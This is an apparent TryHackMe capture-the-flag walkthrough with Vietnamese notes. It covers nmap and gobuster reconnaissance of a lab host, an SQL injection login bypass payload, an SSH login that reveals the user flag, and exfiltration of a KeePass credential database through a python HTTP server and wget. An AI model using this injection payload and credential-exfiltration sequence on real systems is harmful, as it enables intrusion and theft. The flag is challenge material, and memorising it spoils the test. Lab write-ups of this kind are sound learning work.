```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.113.150.25   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-30 04:39 EDT
Nmap scan report for 10.113.150.25
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ff:29:78:b3:06:65:ed:64:12:c6:dd:a4:bf:36:6f:5f (ECDSA)
|_  256 6e:3b:c9:13:24:de:f5:c8:86:67:c9:64:75:a0:f3:6e (ED25519)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 534.35 seconds
```

<img width="955" height="770" alt="Screenshot 2026-07-30 153736" src="https://github.com/user-attachments/assets/46daad86-c5c1-492b-b3f5-61e6153c2712" />

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.113.150.25:5050 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.150.25:5050
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/internal             (Status: 200) [Size: 8770]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

<img width="950" height="695" alt="Screenshot 2026-07-30 153754" src="https://github.com/user-attachments/assets/1026ac66-7500-4bd4-bdba-6f688b170e02" />

Dang nhap vao tai khoan admin bang SQL Injection : `user = admin' or '1=1' --` `password = admin`

<img width="955" height="716" alt="Screenshot 2026-07-30 153824" src="https://github.com/user-attachments/assets/8bfc8b66-5124-4dec-84cd-eb406b5eee32" />

Kiem tra thay dc co the tan cong khai thac o muc

<img width="950" height="562" alt="Screenshot 2026-07-30 154254" src="https://github.com/user-attachments/assets/0e3541c6-8b57-4257-bda3-fa9cfe3717ff" />

Khoi dong burp chan goi tin va sua doi

<img width="958" height="751" alt="Screenshot 2026-07-30 154330" src="https://github.com/user-attachments/assets/1fd4ed3c-5ae4-46b8-96ae-b060fb16f62e" />

<img width="933" height="655" alt="Screenshot 2026-07-30 154346" src="https://github.com/user-attachments/assets/692001a3-95cc-47e1-8379-f714d6658cbd" />

<img width="958" height="768" alt="Screenshot 2026-07-30 154512" src="https://github.com/user-attachments/assets/3e8d4fcb-d2a3-4863-a4e7-f9978e850f7f" />

<img width="950" height="666" alt="Screenshot 2026-07-30 154546" src="https://github.com/user-attachments/assets/c0550d43-f715-42c0-b96e-8afa6dfc7d5d" />

Dang nhap vao ssh

```
┌──(kali㉿kali)-[~]
└─$ ssh sysadmin@10.113.150.25 
sysadmin@10.113.150.25's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 30 08:46:05 UTC 2026

  System load:  0.02               Processes:             104
  Usage of /:   16.1% of 19.31GB   Users logged in:       0
  Memory usage: 69%                IPv4 address for ens5: 10.113.150.25
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

213 updates can be applied immediately.
152 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue May 19 03:18:19 2026 from 192.168.230.214
sysadmin@tryhackme-2204:~$ ls
backups  user.txt
sysadmin@tryhackme-2204:~$ cat user.txt
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

```
sysadmin@tryhackme-2204:~$ cd backups
sysadmin@tryhackme-2204:~/backups$ ls
README.txt  infrastructure.kdbx
sysadmin@tryhackme-2204:~/backups$ cat README.txt
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
sysadmin@tryhackme-2204:~/backups$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```
┌──(kali㉿kali)-[~]
└─$ wget http://10.113.150.25:8080/infrastructure.kdbx

--2026-07-30 04:48:51--  http://10.113.150.25:8080/infrastructure.kdbx
Connecting to 10.113.150.25:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2439 (2.4K) [application/octet-stream]
Saving to: ‘infrastructure.kdbx.1’

infrastructure.kdbx.1        100%[==============================================>]   2.38K  --.-KB/s    in 0s      

2026-07-30 04:48:52 (43.2 MB/s) - ‘infrastructure.kdbx.1’ saved [2439/2439]
```



